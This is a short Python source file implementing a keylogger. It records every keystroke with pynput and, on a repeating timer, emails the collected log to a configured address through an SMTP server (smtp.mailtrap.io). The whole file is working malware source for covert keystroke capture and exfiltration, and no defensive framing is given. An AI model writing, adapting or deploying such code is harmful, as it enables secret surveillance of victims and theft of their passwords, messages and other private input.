import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, username, password, email, start=True):
        self.log = 'Keylogger started'
        self.interval = time_interval
        self.username = username
        self.password = password
        self.email = email
        if start:
            self.start()

    def applend_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = f' {key} '
        self.applend_to_log(current_key)

    def send_mail(self, username, password, email, message):
        server = smtplib.SMTP('smtp.mailtrap.io', 2525)
        server.starttls()
        server.login(username, password)
        server.sendmail(email, email, message)  # sender, receiver, message
        server.quit()

    def report(self):
        if self.log:
            self.log = f'\n\n{self.log}'
            self.send_mail(self.username, self.password, self.email, self.log)
            self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
